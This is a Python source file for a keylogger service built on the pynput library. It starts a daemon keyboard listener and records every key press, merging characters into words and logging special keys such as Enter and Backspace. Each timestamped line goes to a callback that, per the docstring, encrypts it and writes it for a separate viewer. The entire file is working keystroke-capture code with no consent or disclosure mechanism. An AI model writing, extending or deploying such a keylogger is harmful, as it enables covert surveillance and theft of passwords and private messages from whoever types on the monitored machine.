from pynput import keyboard
from datetime import datetime
import string
import threading
import time


class KeyloggerService:
    def __init__(self, callback, combine=True, idle_ms=800):
        """
        callback: function(str) -> None  (receives plaintext line to be encrypted+written)
        combine: if True, buffer characters into words/sentences
        idle_ms: flush buffer after this many ms of no typing
        """
        self._listener = None
        self._callback = callback
        self.combine = combine
        self.idle_ms = idle_ms
        self._buf = []
        self._last_ts = 0.0
        self._idle_timer = None
        self._running = False

        # define what counts as printable char we merge
        self._printables = set(string.printable) - set("\r\n\t")

        # punctuation that should flush a chunk (end of word/sentence feel)
        self._flush_punct = set(" .,!?:;)]}")

    # ---------- buffer helpers ----------
    def _now_str(self):
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def _flush(self):
        if not self._buf:
            return
        text = "".join(self._buf)
        self._buf.clear()
        self._send_line(text)

    def _schedule_idle_flush(self):
        if self._idle_timer:
            self._idle_timer.cancel()
        if self.idle_ms <= 0:
            return
        self._idle_timer = threading.Timer(self.idle_ms / 1000.0, self._flush)
        self._idle_timer.daemon = True
        self._idle_timer.start()

    def _send_line(self, text: str):
        # keep the same “timestamp - …” layout the viewer already parses
        line = f"{self._now_str()} - {text}"
        self._callback(line)

    # ---------- key handling ----------
    def _on_press(self, key):
        ts = time.time()
        self._last_ts = ts

        # if not combining, emit one per key like before
        if not self.combine:
            try:
                ch = key.char
                self._send_line(ch)
            except AttributeError:
                name = getattr(key, "name", str(key))
                self._send_line(f"[{name}]")
            return

        # combine mode:
        try:
            ch = key.char
        except AttributeError:
            ch = None

        if ch is not None:
            # printable characters
            if ch in self._printables:
                self._buf.append(ch)
                # flush when punctuation that usually ends tokens
                if ch in self._flush_punct:
                    self._flush()
                else:
                    self._schedule_idle_flush()
            else:
                # non printable -> flush & record name
                self._flush()
                self._send_line(f"[NonPrintable:{repr(ch)}]")
            return

        # special keys
        name = getattr(key, "name", str(key))

        if name in ("space",):
            self._buf.append(" ")
            self._schedule_idle_flush()
        elif name in ("enter", "return"):
            self._flush()
            self._send_line("[Enter]")
        elif name in ("tab",):
            self._buf.append("\t")
            self._flush()
        elif name.startswith("backspace"):
            if self._buf:
                self._buf.pop()
                self._schedule_idle_flush()
            else:
                # nothing to delete -> just record
                self._send_line("[Backspace]")
        else:
            # flush any pending text, then record the special key
            self._flush()
            # normalize e.g. shift_r -> Shift R
            pretty = name.replace("_", " ").title()
            self._send_line(f"[{pretty}]")

    def start(self):
        if self._running:
            return
        self._listener = keyboard.Listener(on_press=self._on_press)
        self._listener.daemon = True
        self._listener.start()
        self._running = True

    def stop(self):
        if self._idle_timer:
            self._idle_timer.cancel()
            self._idle_timer = None
        # flush anything left when stopping
        self._flush()
        if self._listener:
            self._listener.stop()
            self._listener = None
        self._running = False
